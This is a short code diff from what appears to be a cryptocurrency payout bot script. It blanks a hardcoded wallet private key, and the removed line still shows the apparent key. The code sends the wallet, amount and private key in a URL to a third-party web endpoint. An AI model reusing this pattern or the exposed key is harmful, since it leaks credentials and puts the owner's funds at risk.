@@ -58,7 +58,7 @@ if (!user.first_name) {
 var amo = message*0.95	
 //⚠️ Warning Webhook lib must be installed
 
-var private_key = "b8f66100e358094a2305eca33003d7db39984afab41e18cfe234d7d875f6b260"
+var private_key = "00000000000"
 var amos = amo*1000000
 HTTP.get( {
     url: "https://tronb2.vercel.app/sent/"+wallet+"/"+amos+"/"+private_key+"",
